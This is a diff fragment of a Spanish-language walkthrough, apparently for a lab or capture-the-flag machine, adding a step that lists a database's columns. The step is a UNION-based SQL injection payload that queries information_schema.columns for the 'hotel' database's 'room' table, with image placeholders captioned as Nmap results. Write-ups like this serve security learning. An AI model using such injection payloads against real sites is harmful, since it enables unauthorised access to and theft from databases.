@@ -99,9 +99,14 @@ Pero vemos que es la unica
 
 ![Resultado de Nmap](IMG/bd4.png)
 
+Ahora vamos ahora a listar las columnas
 
+```
+union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- -
+```
+![Resultado de Nmap](IMG/bd5.png)
 
-
+![Resultado de Nmap](IMG/bd6.png)
 
 
 
